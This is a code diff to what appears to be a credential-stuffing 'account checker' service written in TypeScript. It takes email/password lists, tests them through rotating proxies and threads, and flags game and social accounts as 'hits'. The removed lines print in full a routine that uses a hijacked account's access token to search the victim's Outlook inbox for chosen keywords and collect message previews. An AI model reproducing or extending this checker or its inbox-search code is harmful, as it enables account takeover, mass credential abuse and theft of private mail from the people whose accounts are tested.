@@ -168,7 +168,6 @@ interface CheckResult {
   supercell?: { status: string; games: string[] };
   tiktok?: { status: string; username?: string };
   minecraft?: { status: string; username?: string; uuid?: string; capes?: string[] };
-  inboxKeywords?: { keyword: string; count: number; previews: string[] }[];
   error?: string;
   proxyUsed?: string;
 }
@@ -436,8 +435,7 @@ async function checkAccount(
   email: string, 
   password: string, 
   checkMode: string,
-  threadId: number,
-  keywords: string[] = []
+  threadId: number
 ): Promise<CheckResult> {
   const startTime = Date.now();
   const result: CheckResult = { 
@@ -843,20 +841,6 @@ async function checkAccount(
       } catch {}
     }
     
-    // Custom keyword inbox search (like Python's inboxer)
-    if (keywords.length > 0) {
-      try {
-        // accessToken and cid are available from earlier in the function
-        const keywordResults = await searchInboxKeywords(accessToken, cid, keywords);
-        result.inboxKeywords = keywordResults.filter(kr => kr.count > 0);
-        if (result.inboxKeywords.length > 0) {
-          console.log(`[${threadId}] ✓ Found ${result.inboxKeywords.length} keyword matches for ${email}`);
-        }
-      } catch (e) {
-        console.log(`[${threadId}] Keyword search error:`, e);
-      }
-    }
-    
     result.checkDuration = Date.now() - startTime;
     return result;
     
@@ -867,66 +851,6 @@ async function checkAccount(
     result.checkDuration = Date.now() - startTime;
     return result;
   }
-}
-
-// Search inbox for custom keywords (like Python's inboxer feature)
-async function searchInboxKeywords(
-  accessToken: string,
-  cid: string,
-  keywords: string[]
-): Promise<{ keyword: string; count: number; previews: string[] }[]> {
-  const results: { keyword: string; count: number; previews: string[] }[] = [];
-  
-  for (const keyword of keywords) {
-    try {
-      const payload = {
-        "Cvid": crypto.randomUUID(),
-        "Scenario": {"Name": "owa.react"},
-        "TimeZone": "UTC",
-        "TextDecorations": "Off",
-        "EntityRequests": [{
-          "EntityType": "Conversation",
-          "ContentSources": ["Exchange"],
-          "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
-          "From": 0,
-          "Query": {"QueryString": keyword},
-          "Size": 10,
-          "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
-        }]
-      };
-      
-      const res = await fetch("https://outlook.live.com/search/api/v2/query", {
-        method: "POST",
-        headers: {
-          "Authorization": `Bearer ${accessToken}`,
-          "X-AnchorMailbox": `CID:${cid}`,
-          "Content-Type": "application/json",
-          "User-Agent": "Outlook-Android/2.0",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(payload)
-      });
-      
-      if (res.ok) {
-        const data = await res.json();
-        const count = data.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
-        const previews: string[] = [];
-        
-        if (count > 0) {
-          const emailResults = data.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
-          for (const r of emailResults.slice(0, 3)) {
-            if (r.Preview) {
-              previews.push(r.Preview.substring(0, 100));
-            }
-          }
-        }
-        
-        results.push({ keyword, count, previews });
-      }
-    } catch {}
-  }
-  
-  return results;
 }
 
 // Build detailed message for hit (following Python output format)
@@ -973,12 +897,6 @@ function buildHitMessage(result: CheckResult): string {
     parts.push(`⛏️MC:${result.minecraft.username || 'Yes'}`);
   }
   
-  // Inbox keywords
-  if (result.inboxKeywords?.length) {
-    const kwSummary = result.inboxKeywords.slice(0, 3).map(k => `${k.keyword}:${k.count}`).join(',');
-    parts.push(`🔑Keywords:${kwSummary}`);
-  }
-  
   return parts.join(' | ');
 }
 
@@ -989,8 +907,7 @@ async function processAccountsBackground(
   threads: number,
   sessionId: string,
   userId: string | null,
-  userEmail: string | null,
-  keywords: string[] = []
+  userEmail: string | null
 ): Promise<void> {
   const startTime = Date.now();
   const total = accounts.length;
@@ -1054,7 +971,7 @@ async function processAccountsBackground(
       }
       
       try {
-        const result = await checkAccount(email.trim(), password.trim(), checkMode, workerId, keywords);
+        const result = await checkAccount(email.trim(), password.trim(), checkMode, workerId);
         processedResults[idx] = result;
         results.push(result);
         
@@ -1164,8 +1081,7 @@ serve(async (req) => {
       checkMode = "all", 
       threads = 5, 
       sessionId = null,
-      proxies = [],  // Optional proxy list for rotation
-      keywords = []  // Optional keywords for inbox search
+      proxies = []  // NEW: Optional proxy list for rotation
     } = body;
 
     // Initialize proxy rotator if proxies provided
@@ -1178,7 +1094,6 @@ serve(async (req) => {
     console.log(`${getCanaryTimestamp()} User: ${userEmail || userId || 'Anonymous'}`);
     console.log(`${getCanaryTimestamp()} Accounts: ${accounts?.length || 0} | Mode: ${checkMode} | Threads: ${threads}`);
     console.log(`${getCanaryTimestamp()} Proxies: ${proxyStats.total} loaded, ${proxyStats.active} active`);
-    console.log(`${getCanaryTimestamp()} Keywords: ${keywords?.length || 0} custom keywords`);
 
     if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
       return new Response(
@@ -1206,7 +1121,7 @@ serve(async (req) => {
     
     // Start background processing
     EdgeRuntime.waitUntil(
-      processAccountsBackground(accounts, checkMode, threads, jobSessionId, userId, userEmail, keywords)
+      processAccountsBackground(accounts, checkMode, threads, jobSessionId, userId, userEmail)
         .catch(error => {
           console.error(`${getCanaryTimestamp()} Background error:`, error);
         })
@@ -1219,8 +1134,7 @@ serve(async (req) => {
         sessionId: jobSessionId,
         total: accounts.length,
         proxies: proxyStats,
-        keywords: keywords?.length || 0,
-        message: `Started processing ${accounts.length} accounts${proxyStats.total > 0 ? ` with ${proxyStats.total} proxies` : ''}${keywords?.length > 0 ? ` and ${keywords.length} keywords` : ''}. Watch the live feed for progress.`
+        message: `Started processing ${accounts.length} accounts${proxyStats.total > 0 ? ` with ${proxyStats.total} proxies` : ''}. Watch the live feed for progress.`
       }),
       { headers: { ...corsHeaders, "Content-Type": "application/json" } }
     );
